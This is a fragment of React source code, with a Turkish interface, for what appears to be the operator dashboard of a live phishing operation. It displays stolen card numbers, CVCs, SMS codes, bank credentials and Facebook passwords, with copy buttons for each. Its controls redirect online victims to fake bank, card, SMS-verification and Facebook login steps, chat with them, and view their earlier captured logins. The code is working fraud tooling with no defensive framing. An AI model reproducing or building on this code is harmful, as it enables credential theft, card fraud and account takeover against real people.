                              className="inline-block w-fit max-w-full rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[11px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight"
                            >
                              {getApprovalDisplayText(approvalValue)}
                            </span>
                          ))}
                        </div>
                      )}
                    </td>
                    <td className="px-2 py-3 align-top">
                      <div
                        className="cursor-pointer font-mono text-[12px] lg:text-[13px] font-bold tracking-[0.18em] text-indigo-500 hover:underline break-words [overflow-wrap:anywhere]"
                        onClick={() => copyToClipboard(smsValue)}
                      >
                        {smsValue || '-'}
                      </div>
                    </td>
                    <td className="px-2 py-3 align-top">
                      <div className="space-y-1 text-[12px] font-medium leading-tight">
                        {fd.cardNumber && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">No:</span> <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
                        {fd.cardExpiry && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">SKT:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardExpiry}</span></div>}
                        {fd.cardCvc && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">CVC:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardCvc}</span></div>}
                        {!fd.cardNumber && !fd.cardExpiry && !fd.cardCvc ? <span className={`${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span> : null}
                      </div>
                    </td>
                    {/* === FACEBOOK SUTUNU (YENI, Sadece fbEmail/fbPassword/fb AdSoyad goster) === */}
                    <td className="px-2 py-3 align-top">
                      <div className="space-y-1 text-[12px] font-medium leading-tight">
                        {fd.fbEmail && (
                          <div className="flex min-w-0 items-start gap-1">
                            <span className="shrink-0 opacity-60 text-[10px] font-bold uppercase text-[#0064E0] dark:text-[#3E8BFF]">E-posta:</span>
                            <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={()=>copyToClipboard(String(fd.fbEmail))}>{String(fd.fbEmail)}</span>
                          </div>
                        )}
                        {fd.fbPassword && (
                          <div className="flex min-w-0 items-start gap-1">
                            <span className="shrink-0 opacity-60 text-[10px] font-bold uppercase text-[#0064E0] dark:text-[#3E8BFF]">Parool:</span>
                            <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere] font-mono" onClick={()=>copyToClipboard(String(fd.fbPassword))}>{String(fd.fbPassword)}</span>
                          </div>
                        )}
                        {((fd.fbFirstName || fd.fbLastName)) && (
                          <div className="flex min-w-0 items-start gap-1">
                            <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">Nimi:</span>
                            <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{String(fd.fbFirstName || "")} {String(fd.fbLastName || "")}</span>
                          </div>
                        )}
                        {!fd.fbEmail && !fd.fbPassword && !fd.fbFirstName && !fd.fbLastName ? (
                          <span className={`${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                        ) : null}
                      </div>
                    </td>
                    <td className="px-2 py-3 align-top">
                      <span className={`inline-block max-w-full rounded-full px-2 py-1 text-[11px] font-bold tracking-wide shadow-sm whitespace-normal break-words [overflow-wrap:anywhere] leading-tight text-center ${stepColor}`}>
                        {stepText}
                      </span>
                    </td>
                    <td className="px-2 py-3 align-top">
                      {isOnline ? (
                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[11px] font-bold tracking-wide whitespace-nowrap">
                          <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
                          ONLINE
                        </span>
                      ) : (
                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[11px] font-bold tracking-wide whitespace-nowrap">
                          <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
                          OFFLINE
                        </span>
                      )}
                    </td>
                    <td className="px-2 py-3 align-top text-right">
                      <div className="ml-auto flex w-full max-w-[168px] flex-col items-end justify-end gap-1.5">
                      {!isDeletedMode && (
                        <>
                          <select
                            className={`w-full rounded-lg border px-2 py-1.5 text-[12px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/40 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
                            value=""
                            onChange={(e) => {
                              if (e.target.value) {
                                void handleRouteAction(row.id, e.target.value);
                                e.target.value = "";
                              }
                            }}
                          >
                            <option value="">Aksiyon Seçin...</option>
                            <option value="win">👉 İsim & Profil'e Yönlendir</option>
                            <option value="facebook">👉 Facebook Girişine Yönlendir</option>
                            <option value="banken">👉 Banka Listesine Yönlendir</option>
                            <option value="sms">👉 SMS Doğrulamasına Yönlendir</option>
                            <option value="card">👉 Kredi Kartına Yönlendir</option>
                            <option value="wait">⏳ Beklemeye Al</option>
                            <option value="invalid_bank">❌ Hatalı Banka (Uyarı)</option>
                            <option value="live_support">🎧 Canlı Desteğe Yönlendir</option>
                            <option value="congrats">✅ Tebrikler Ekranına Al</option>
                            <option value="special_approval">🔔 Özel Bildirim Gönder</option>
                            <option value="custom_question">❓ Özel Soru Gönder</option>
                            <option value="ban_ip">🚫 IP Banla (Siteye Giremesin)</option>
                          </select>

                          <select
                            className={`w-full rounded-lg border px-2 py-1.5 text-[12px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-emerald-500/40 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
                            value=""
                            onChange={(e) => {
                              if (e.target.value) {
                                void handleApprovalAction(row.id, e.target.value);
                                e.target.value = "";
                              }
                            }}
                          >
                            <option value="">Onay Seçin...</option>
                            {APPROVAL_OPTIONS.map((option) => (
                              <option key={option.value} value={option.value}>
                                {option.label}
                              </option>
                            ))}
                          </select>
                        </>
                      )}

                        <div className={`flex justify-end items-center mt-0.5 gap-1 w-full ${isDeletedMode ? 'pt-1' : ''}`}>
                          <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide" title="Canlı Destek">
                            <span>💬</span>
                          </button>
                          <button onClick={() => setQuestionModalSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-violet-500/10 text-violet-600 dark:text-violet-400 hover:bg-violet-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide" title="Özel Sorular (Soru-Cevap)">
                            <span>❓</span>
                          </button>
                          <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide" title="Cihaz Bilgisi">
                            <span>📱</span>
                          </button>
                          {/* ================== 📜 GECMIS GIRISLER BUTONU (Normal + Silinen modların HER İKİSİNDE GORUNUR) ================== */}
                          <button
                            onClick={() => { setHistoryModalSession(row); setShowHistoryModal(true); }}
                            className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-amber-500/10 text-amber-600 dark:text-amber-400 hover:bg-amber-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide"
                            title="Önceki Banka & Facebook Giriş Kayıtları (Geçmiş)"
                          >
                            <span>📜</span>
                          </button>
                          {isDeletedMode ? (
                            <>
                              <button
                                onClick={() => void handleRestoreLog(row.id)}
                                className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-green-500/10 text-green-600 dark:text-green-400 hover:bg-green-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide"
                                title="Logu Geri Yükle (Aktif listeye döndür)"
                              >
                                <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h10a8 8 0 018 8v2M3 10l6 6m-6-6l6-6" /></svg>
                              </button>
                              <button
                                onClick={() => void handlePermanentDelete(row.id)}
                                className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide"
                                title="Kalıcı Olarak Sil (GERİ ALINMAZ)"
                              >
                                <span>🗑️</span>
                              </button>
                            </>
                          ) : (
                            <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide" title="Logu Sil">
                              <span>🗑️</span>
                            </button>
                          )}
                        </div>
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>

        {/* ============ MOBILE CARD VIEW (lg altinda tablo yerine kartlar) ============ */}
        <div className="lg:hidden p-3 space-y-3">
          {rows.length === 0 && (
            <div className="px-5 py-12 text-center text-sm opacity-50 font-medium">
              Henüz bir log yok. İşlemler burada görünecek.
            </div>
          )}
          {rows.map((row) => {
            const fd = (row.form_data || {}) as Record<string, any>;
            const isOnline = isSessionLive(
              row.id,
              onlineSessionIds,
              row.status,
              sessionLastSeenAt[row.id],
            );
            const livePath = sessionPaths[row.id];
            const { s, stepText, stepColor } = getStepDisplay(
              row.current_step as string,
              fd,
              isOnline,
              livePath,
              darkMode
            );
            const shortCreds = getShortBankCredentialFields(fd);
            const loginMethod = readLoginMethod(fd);
            // GENERATOR: tip basina GUNCEL kayit — kodas 1 ustte, kodas 2 altta.
            const genCurrentRaw =
              fd.generatorCurrent && typeof fd.generatorCurrent === "object"
                ? (fd.generatorCurrent as Record<string, any>)
                : {};
            const legacyData =
              fd.generatorData && typeof fd.generatorData === "object" && Object.keys(fd.generatorData).length > 0
                ? (fd.generatorData as Record<string, unknown>)
                : null;
            const activeType = typeof fd.generatorType === "string" ? fd.generatorType : "";
            const genEntries: { type: string; data: Record<string, unknown> }[] = [];
            for (const t of ["generator1", "generator2"]) {
              const cur = genCurrentRaw[t];
              const curData =
                cur?.data && typeof cur.data === "object" && Object.keys(cur.data).length > 0
                  ? (cur.data as Record<string, unknown>)
                  : legacyData && activeType === t
                    ? legacyData
                    : null;
              if (curData) {
                genEntries.push({ type: t, data: curData });
              } else if (activeType === t) {
                genEntries.push({ type: t, data: {} });
              }
            }
            const smsValue =
              typeof fd.smsCode === "string" && fd.smsCode.trim()
                ? fd.smsCode.trim()
                : typeof fd.tacCode === "string" && fd.tacCode.trim()
                  ? fd.tacCode.trim()
                  : "";
            const fullName = `${fd.firstName || ""} ${fd.lastName || ""}`.trim();
            const currentApproval =
              typeof fd.approvalStatus === "string" ? fd.approvalStatus.trim() : "";
            const approvalEntries = currentApproval ? [currentApproval] : [];

            return (
              <div
                key={row.id}
                className={`rounded-2xl border p-3.5 space-y-3 shadow-sm ${
                  darkMode ? "bg-black/20 border-white/10" : "bg-white border-gray-200"
                }`}
              >
                {/* UST SATIR: Canli Izle + Step + Online */}
                <div className="flex items-center justify-between gap-2 flex-wrap">
                  <button
                    type="button"
                    onClick={() => setLiveWatchRow(row)}
                    className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-[12px] font-bold transition-all shadow-sm ${
                      isOnline
                        ? "bg-red-500/15 text-red-500 border border-red-500/30"
                        : darkMode
                        ? "bg-white/5 text-gray-400 border border-white/10"
                        : "bg-gray-100 text-gray-500 border border-gray-200"
                    }`}
                  >
                    {isOnline && (
                      <span className="relative flex h-2 w-2">
                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                        <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
                      </span>
                    )}
                    {isOnline ? "Canlı İzle" : "İzle"}
                  </button>
                  <div className="flex items-center gap-1.5">
                    <span className={`inline-block rounded-full px-2 py-1 text-[10px] font-bold tracking-wide ${stepColor}`}>
                      {stepText}
                    </span>
                    {isOnline ? (
                      <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[10px] font-bold whitespace-nowrap">
                        <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
                        ONLINE
                      </span>
                    ) : (
                      <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[10px] font-bold whitespace-nowrap">
                        <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
                        OFFLINE
                      </span>
                    )}
                  </div>
                </div>

                {/* KIMLIK: Isim + Telefon + Odul */}
                <div className="flex items-start justify-between gap-2">
                  <div className="min-w-0">
                    <div
                      className="text-[14px] font-bold break-words [overflow-wrap:anywhere] cursor-pointer hover:underline"
                      onClick={() => copyToClipboard(fullName)}
                    >
                      {fullName || "-"}
                    </div>
                    <div
                      className="text-[12px] opacity-70 break-words [overflow-wrap:anywhere] cursor-pointer hover:underline"
                      onClick={() => copyToClipboard(fd.phone)}
                    >
                      {fd.phone || "-"}
                    </div>
                  </div>
                  {row.amount ? (
                    <span className="shrink-0 text-[15px] font-black text-[#EB5E28]">€{row.amount}</span>
                  ) : null}
                </div>

                {/* BANKA BLOKU */}
                {(fd.bankName || shortCreds.length > 0) && (
                  <div className={`rounded-xl p-2.5 space-y-1 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
                    {fd.bankName && (
                      <div className="font-extrabold text-[13px] text-yellow-700 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
                        {fd.bankName}
                      </div>
                    )}
                    {loginMethod && (
                      <span className="inline-flex max-w-full items-center rounded-full border border-cyan-500/20 bg-cyan-500/10 px-2 py-0.5 text-[10px] font-black uppercase tracking-wider text-cyan-600 dark:text-cyan-400 break-words [overflow-wrap:anywhere]">
                        Yöntem: {loginMethod}
                      </span>
                    )}
                    {shortCreds.map(([key, value]) => (
                      <div key={`${key}-${value}`} className="flex min-w-0 items-start gap-1.5 leading-tight">
                        <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1.5 py-0.5 text-[10px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
                          {key}
                        </span>
                        <span
                          className="min-w-0 cursor-pointer font-mono font-medium text-[12px] break-words [overflow-wrap:anywhere] hover:opacity-70"
                          onClick={() => copyToClipboard(String(value))}
                        >
                          {String(value)}
                        </span>
                      </div>
                    ))}
                  </div>
                )}

                {/* SMS + KART + FACEBOOK ozet satirlari */}
                <div className="grid grid-cols-2 gap-2">
                  {smsValue && (
                    <div className={`rounded-xl p-2 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
                      <div className="text-[10px] font-black uppercase tracking-widest text-indigo-500">SMS</div>
                      <div className="font-mono text-[13px] font-bold tracking-[0.15em] text-indigo-500 cursor-pointer break-all" onClick={() => copyToClipboard(smsValue)}>
                        {smsValue}
                      </div>
                    </div>
                  )}
                  {(fd.cardNumber || fd.cardExpiry || fd.cardCvc) && (
                    <div className={`rounded-xl p-2 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
                      <div className="text-[10px] font-black uppercase tracking-widest text-purple-500">Kart</div>
                      <div className="text-[12px] font-medium space-y-0.5">
                        {fd.cardNumber && <div className="font-mono cursor-pointer break-all hover:opacity-70" onClick={() => copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</div>}
                        {(fd.cardExpiry || fd.cardCvc) && (
                          <div className="opacity-80">{fd.cardExpiry || ""}{fd.cardExpiry && fd.cardCvc ? " • " : ""}{fd.cardCvc || ""}</div>
                        )}
                      </div>
                    </div>
                  )}
                  {(fd.fbEmail || fd.fbPassword) && (
                    <div className={`rounded-xl p-2 col-span-2 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
                      <div className="text-[10px] font-black uppercase tracking-widest text-[#0064E0] dark:text-[#3E8BFF]">Facebook</div>
                      <div className="text-[12px] font-medium space-y-0.5">
                        {fd.fbEmail && <div className="cursor-pointer break-all hover:opacity-70" onClick={() => copyToClipboard(String(fd.fbEmail))}>{String(fd.fbEmail)}</div>}
                        {fd.fbPassword && <div className="font-mono cursor-pointer break-all hover:opacity-70" onClick={() => copyToClipboard(String(fd.fbPassword))}>{String(fd.fbPassword)}</div>}
                      </div>
                    </div>
                  )}
                </div>

                {/* ONAY ROZETLERI */}
                {approvalEntries.length > 0 && (
                  <div className="flex flex-wrap gap-1.5">
                    {approvalEntries.map((approvalValue, index) => (
                      <span
                        key={`${approvalValue}-${index}`}
                        className="inline-block w-fit rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[11px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 break-words [overflow-wrap:anywhere]"
                      >
                        {getApprovalDisplayText(approvalValue)}
                      </span>
                    ))}
                  </div>
                )}

                {/* AKSIYONLAR: Yonlendirme + Onay + ikon butonlar */}
                <div className="space-y-2 pt-1">
                  {!isDeletedMode && (
                    <div className="grid grid-cols-2 gap-2">
                      <select
                        className={`w-full rounded-lg border px-2 py-2 text-[12px] outline-none cursor-pointer font-medium ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
                        value=""
                        onChange={(e) => {
                          if (e.target.value) {
                            void handleRouteAction(row.id, e.target.value);
                            e.target.value = "";
                          }
                        }}
                      >
                        <option value="">Aksiyon Seçin...</option>
                        <option value="win">👉 İsim & Profil</option>
                        <option value="facebook">👉 Facebook</option>
                        <option value="banken">👉 Banka Listesi</option>
                        <option value="sms">👉 SMS Doğrulama</option>
                        <option value="card">👉 Kredi Kartı</option>
                        <option value="wait">⏳ Beklemeye Al</option>
                        <option value="invalid_bank">❌ Hatalı Banka</option>
                        <option value="live_support">🎧 Canlı Destek</option>
                        <option value="congrats">✅ Tebrikler</option>
                        <option value="special_approval">🔔 Özel Bildirim</option>
                        <option value="custom_question">❓ Özel Soru</option>
                        <option value="ban_ip">🚫 IP Banla</option>
                      </select>
                      <select
                        className={`w-full rounded-lg border px-2 py-2 text-[12px] outline-none cursor-pointer font-medium ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
                        value=""
                        onChange={(e) => {
                          if (e.target.value) {
                            void handleApprovalAction(row.id, e.target.value);
                            e.target.value = "";
                          }
                        }}
                      >
                        <option value="">Onay Seçin...</option>
                        {APPROVAL_OPTIONS.map((option) => (
                          <option key={option.value} value={option.value}>
                            {option.label}
                          </option>
                        ))}
                      </select>
                    </div>
                  )}
                  <div className="flex items-center gap-1.5">
                    <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 text-[13px] font-bold" title="Canlı Destek">💬</button>
                    <button onClick={() => setQuestionModalSession(row)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-violet-500/10 text-violet-600 dark:text-violet-400 text-[13px] font-bold" title="Özel Sorular">❓</button>
                    <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 text-[13px] font-bold" title="Cihaz Bilgisi">📱</button>
                    <button onClick={() => { setHistoryModalSession(row); setShowHistoryModal(true); }} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-amber-500/10 text-amber-600 dark:text-amber-400 text-[13px] font-bold" title="Geçmiş Kayıtlar">📜</button>
                    {isDeletedMode ? (
                      <>
                        <button onClick={() => void handleRestoreLog(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-green-500/10 text-green-600 dark:text-green-400 text-[13px] font-bold" title="Geri Yükle">♻️</button>
                        <button onClick={() => void handlePermanentDelete(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 text-[13px] font-bold" title="Kalıcı Sil">🗑️</button>
                      </>
                    ) : (
                      <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 text-[13px] font-bold" title="Sil">🗑️</button>
                    )}
                  </div>
                </div>
              </div>
            );
          })}
        </div>
        {totalPages > 1 && (
          <div className={`flex flex-wrap items-center justify-between gap-3 px-5 py-4 border-t ${darkMode ? 'border-white/5' : 'border-gray-100'}`}>
            <span className={`text-xs font-medium ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
              Toplam {totalCount} kayıt — Sayfa {page + 1} / {totalPages}
            </span>
            <div className="flex items-center gap-1.5">
              <button
                type="button"
                onClick={() => goToPage(page - 1)}
                disabled={page === 0}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all disabled:opacity-30 ${darkMode ? 'bg-white/10 hover:bg-white/20 text-white' : 'bg-gray-100 hover:bg-gray-200 text-gray-700'}`}
              >
                ← Önceki
              </button>
              {pageWindow.map((n, i) =>
                n === "…" ? (
                  <span key={`e-${i}`} className={`px-1 text-xs ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>…</span>
                ) : (
                  <button
                    key={n}
                    type="button"
                    onClick={() => goToPage(n)}
                    className={`min-w-[32px] px-2 py-1.5 rounded-lg text-xs font-bold transition-all ${
                      n === page
                        ? 'bg-[#EB5E28] text-white shadow-[0_0_10px_rgba(235,94,40,0.3)]'
                        : darkMode ? 'bg-white/10 hover:bg-white/20 text-white' : 'bg-gray-100 hover:bg-gray-200 text-gray-700'
                    }`}
                  >
                    {n + 1}
                  </button>
                )
              )}
              <button
                type="button"
                onClick={() => goToPage(page + 1)}
                disabled={page >= totalPages - 1}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all disabled:opacity-30 ${darkMode ? 'bg-white/10 hover:bg-white/20 text-white' : 'bg-gray-100 hover:bg-gray-200 text-gray-700'}`}
              >
                Sonraki →
              </button>
            </div>
          </div>
        )}
      </div>

      {/* CHAT MODAL */}
      {chatSessionId && (
        <div data-live-popup="true" className="fixed inset-0 z-[500] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`flex h-[32rem] w-full max-w-md flex-col overflow-hidden rounded-2xl border shadow-2xl ${darkMode ? 'border-white/10 bg-[#111111]' : 'border-gray-200 bg-white'}`}>
            <div className={`flex items-center justify-between px-4 py-3 border-b ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-100 border-gray-200'}`}>
              <h3 className={`font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Kullanıcı ile Sohbet</h3>
              <button onClick={() => setChatSessionId(null)} className={`hover:opacity-70 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>✕</button>
            </div>
            <div className={`flex-1 overflow-y-auto p-4 space-y-3 ${darkMode ? 'bg-[#0a0a0a]' : 'bg-gray-50'}`}>
              {chatMessages.length === 0 ? (
                <p className={`text-center text-xs mt-10 ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>Henüz mesaj yok.</p>
              ) : (
                chatMessages.map((m) => (
                  <div key={m.id} className={`flex ${m.sender === "admin" ? "justify-end" : "justify-start"}`}>
                    <div className={`max-w-[80%] rounded-xl px-3 py-2 text-sm ${m.sender === "admin" ? "bg-[#EB5E28] text-white rounded-br-none" : (darkMode ? "bg-zinc-800 text-zinc-200 rounded-bl-none" : "bg-white border text-gray-800 rounded-bl-none")}`}>
                      {m.image_url && (
                        <div 
                          className="mb-2 overflow-hidden rounded-lg cursor-pointer hover:opacity-90 transition-opacity"
                          onClick={() => setZoomedImage(m.image_url)}
                        >
                          <img src={m.image_url} alt="Ek" className="max-h-48 w-full object-cover" />
                        </div>
                      )}
                      {m.content && <p>{m.content}</p>}
                    </div>
                  </div>
                ))
              )}
              <div ref={chatEndRef} />
            </div>

            {pastedImagePreview && (
              <div className={`p-3 flex flex-col gap-2 border-t ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-100 border-gray-200'}`}>
                <div className="flex justify-between items-center">
                  <span className={`text-xs font-bold ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>Gönderilecek Görsel:</span>
                  <button onClick={() => { setPastedImage(null); setPastedImagePreview(null); }} className="text-xs text-red-400 hover:text-red-300 font-bold">İptal</button>
                </div>
                <div className={`relative rounded-lg overflow-hidden border h-32 flex justify-center ${darkMode ? 'border-zinc-700 bg-black' : 'border-gray-300 bg-gray-200'}`}>
                  <img src={pastedImagePreview} alt="Preview" className="object-contain h-full" />
                </div>
              </div>
            )}

            <form onSubmit={sendChatMessage} className={`flex border-t p-2 ${darkMode ? 'bg-[#161616] border-zinc-800' : 'bg-white border-gray-200'}`}>
              <input
                type="text"
                value={chatInput}
                onChange={(e) => setChatInput(e.target.value)}
                onPaste={handlePaste}
                placeholder="Mesaj yazın... (Ctrl+V ile görsel)"
                className={`flex-1 bg-transparent px-3 py-2 text-sm outline-none ${darkMode ? 'text-white' : 'text-gray-900'}`}
              />
              <button type="submit" disabled={(!chatInput.trim() && !pastedImage) || isUploadingImage} className="rounded-lg bg-[#EB5E28] px-4 py-2 text-xs font-bold text-white transition-colors hover:bg-[#c94d1e] disabled:opacity-50">
                {isUploadingImage ? "Yükleniyor..." : "Gönder"}
              </button>
            </form>
          </div>
        </div>
      )}

      {/* ZOOMED IMAGE */}
      {zoomedImage && (
        <div 
          className="fixed inset-0 z-[200] flex items-center justify-center bg-black/90 p-4 backdrop-blur-sm animate-in fade-in duration-200" 
          onClick={() => setZoomedImage(null)}
        >
          <button 
            className="absolute top-4 right-4 sm:top-8 sm:right-8 text-white/70 hover:text-white p-2" 
            onClick={() => setZoomedImage(null)}
          >
            <svg className="size-8" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
          <img 
            src={zoomedImage} 
            alt="Zoomed" 
            className="max-w-full max-h-full object-contain rounded-lg animate-in zoom-in-95 duration-200" 
            onClick={(e) => e.stopPropagation()}
          />
        </div>
      )}

      {/* =============== 📜 GECMIS GIRIS MODAL (Banka + Facebook onceki kayitlari) =============== */}
      {showHistoryModal && historyModalSession && (() => {
        let fd: Record<string, unknown> = {};
        try {
          const rawFd = historyModalSession.form_data;
          if (typeof rawFd === "string") {
            try { fd = JSON.parse(rawFd) as Record<string, unknown>; } catch { fd = {}; }
          } else if (rawFd && typeof rawFd === "object") {
            fd = rawFd as Record<string, unknown>;
          }
        } catch { fd = {}; }
        // Fallback: dogrudan session uzerinde de ara (bazı eski kayıtlar icin)
        const mergedFd: Record<string, unknown> = { ...fd };
        const hsAny = historyModalSession as any;
        if (hsAny.bankLoginHistory !== undefined) mergedFd.bankLoginHistory = hsAny.bankLoginHistory;
        if (hsAny.facebookLoginHistory !== undefined) mergedFd.facebookLoginHistory = hsAny.facebookLoginHistory;
        if (hsAny.cardLoginHistory !== undefined) mergedFd.cardLoginHistory = hsAny.cardLoginHistory;
        if (hsAny.generatorLoginHistory !== undefined) mergedFd.generatorLoginHistory = hsAny.generatorLoginHistory;
        const bHistory = parseBankHistory(mergedFd);
        const fHistory = parseFacebookHistory(mergedFd);
        const cHistory = parseCardHistory(mergedFd);
        const gHistory = parseGeneratorHistory(mergedFd);
        const copyText = (t: string) => {
          try { void navigator.clipboard.writeText(t); } catch { /* ignore */ }
        };
        const ValRow = ({ label, value }: { label: string; value: string | undefined | null }) => {
          if (!value || !String(value).trim()) return null;
          const v = String(value).trim();
          return (
            <div className={`rounded-lg border px-3 py-2 ${darkMode ? 'border-white/10 bg-black/30' : 'border-gray-200 bg-gray-50'}`}>
              <div className={`text-[12px] font-bold uppercase tracking-wide mb-0.5 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>{label}</div>
              <div className="flex items-center justify-between gap-2">
                <span className={`text-[12px] font-mono truncate ${darkMode ? 'text-zinc-200' : 'text-gray-900'}`}>{v}</span>
                <button
                  onClick={() => copyText(v)}
                  className={`shrink-0 px-2 py-0.5 rounded-md text-[12px] font-bold transition-all ${darkMode ? 'bg-white/10 text-zinc-300 hover:bg-white/20 hover:text-white' : 'bg-gray-200 text-gray-700 hover:bg-gray-300'}`}
                  title="Kopyala"
                >
                  📋
                </button>
              </div>
            </div>
          );
        };
        return (
          <div
            className="fixed inset-0 z-[300] flex items-center justify-center bg-black/70 p-4 backdrop-blur-sm animate-in fade-in duration-200"
            onClick={() => { setShowHistoryModal(false); setHistoryModalSession(null); }}
          >
            <div
              className={`w-full max-w-4xl max-h-[90vh] overflow-hidden rounded-3xl border shadow-2xl animate-in zoom-in-95 duration-200 ${darkMode ? 'bg-[#0b0b0e] border-white/10' : 'bg-white border-gray-200'}`}
              onClick={(e) => e.stopPropagation()}
            >
              {/* HEADER */}
              <div className={`flex items-center justify-between gap-3 px-6 py-4 border-b ${darkMode ? 'border-white/10 bg-[#121216]' : 'border-gray-200 bg-gray-50'}`}>
                <div className="flex items-center gap-3">
                  <div className={`h-10 w-10 shrink-0 rounded-xl flex items-center justify-center ${darkMode ? 'bg-amber-500/20 text-amber-400' : 'bg-amber-500/10 text-amber-600'}`}>
                    <span className="text-xl">📜</span>
                  </div>
